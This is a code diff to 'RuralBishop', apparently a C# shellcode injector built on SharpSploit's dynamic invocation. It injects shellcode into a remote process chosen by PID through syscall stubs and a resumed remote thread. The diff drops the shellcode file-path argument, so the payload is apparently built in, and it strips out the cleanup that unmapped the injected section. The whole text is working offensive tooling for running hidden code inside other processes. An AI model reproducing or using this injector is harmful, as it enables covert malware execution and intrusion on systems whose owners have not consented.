@@ -6,10 +6,10 @@ namespace RuralBishop
 {
     class Program
     {
-        public static void KnightKingside(String Path, QueensGambit.PROC_VALIDATION Pv, bool Clean)
+        public static void KnightKingside( QueensGambit.PROC_VALIDATION Pv)
         {
             // Read in sc bytes
-            QueensGambit.SC_DATA scd = QueensGambit.ReadShellcode(Path);
+            QueensGambit.SC_DATA scd = QueensGambit.ReadShellcode();
             if (scd.iSize == 0)
             {
                 Console.WriteLine("[!] Unable to read shellcode bytes..");
@@ -97,68 +97,34 @@ namespace RuralBishop
             {
                 Console.WriteLine("[!] Failed to resume thread..");
             }
-
-            // Wait & clean up?
-            if (Clean)
-            {
-                Console.WriteLine("[>] Waiting for payload to finish..");
-                while (true)
-                {
-                    QueensGambit.THREAD_BASIC_INFORMATION ts = QueensGambit.GetThreadState(hRemoteThread);
-                    if (ts.ExitStatus != 259) // STILL_ACTIVE
-                    {
-                        Console.WriteLine("    |-> Thread exit status -> " + ts.ExitStatus);
-
-                        pSysCall = SharpSploit.Execution.DynamicInvoke.Generic.GetSyscallStub("NtUnmapViewOfSection");
-                        QueensGambit.NtUnmapViewOfSection fSyscallNtUnmapViewOfSection = (QueensGambit.NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(pSysCall, typeof(QueensGambit.NtUnmapViewOfSection));
-                        UInt32 Unmap = fSyscallNtUnmapViewOfSection(Pv.hProc, RemoteSect.pBase);
-
-                        if (Unmap == 0)
-                        {
-                            Console.WriteLine("    |-> NtUnmapViewOfSection");
-                        }
-                        else
-                        {
-                            Console.WriteLine("[!] Failed to unmap remote section..");
-                        }
-
-                        break;
-                    }
-
-                    System.Threading.Thread.Sleep(400); // Sleep precious, sleep
-                }
-            }
         }
 
         static void Main(string[] args)
         {
-            QueensGambit.PrintBanner();
-            if (args.Length == 0)
-            {
-                QueensGambit.GetHelp();
-            }
-            else
-            {
-                int iPathScBin = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(p|Path)$").Match(s).Success);
+            //QueensGambit.PrintBanner();
+            //if (args.Length == 0)
+            //{
+            //    QueensGambit.GetHelp();
+            //}
+            //else
+            
+                //int iPathScBin = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(p|Path)$").Match(s).Success);
                 int iPID = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);
-                int bClean = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(c|Clean)$").Match(s).Success);
+               
 
-                if (iPathScBin != -1 && iPID != -1)
+                if (iPID != -1)
                 {
-                    Boolean Clean = false;
-                    if (bClean != -1)
-                    {
-                        Clean = true;
-                    }
+                    
 
                     try
                     {
-                        String sPathScBin = args[(iPathScBin + 1)];
+                        //String sPathScBin = args[(iPathScBin + 1)];
                         Int32 Proc = int.Parse(args[(iPID + 1)]);
-                        Boolean bFilePath = QueensGambit.PathIsFile(sPathScBin);
-                        QueensGambit.PROC_VALIDATION pv = QueensGambit.ValidateProc(Proc);
+                    //Boolean bFilePath = QueensGambit.PathIsFile(sPathScBin);
+                    int bClean = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(c|Clean)$").Match(s).Success);
+                    QueensGambit.PROC_VALIDATION pv = QueensGambit.ValidateProc(Proc);
 
-                        if (!bFilePath || !pv.isvalid || pv.hProc == IntPtr.Zero)
+                        if ( !pv.isvalid || pv.hProc == IntPtr.Zero)
                         {
                             if (!pv.isvalid)
                             {
@@ -177,7 +143,7 @@ namespace RuralBishop
                             Console.WriteLine("| Process    : " + pv.sName);
                             Console.WriteLine("| Handle     : " + pv.hProc);
                             Console.WriteLine("| Is x32     : " + pv.isWow64);
-                            Console.WriteLine("| Sc binpath : " + sPathScBin);
+                            //Console.WriteLine("| Sc binpath : " + sPathScBin);
                             Console.WriteLine("|--------");
 
                             if (pv.isWow64)
@@ -186,7 +152,7 @@ namespace RuralBishop
                                 return;
                             }
 
-                            KnightKingside(sPathScBin, pv, Clean);
+                            KnightKingside( pv );
                         }
                     }
                     catch
@@ -198,7 +164,7 @@ namespace RuralBishop
                 {
                     QueensGambit.GetHelp();
                 }
-            }
+            
         }
     }
 }
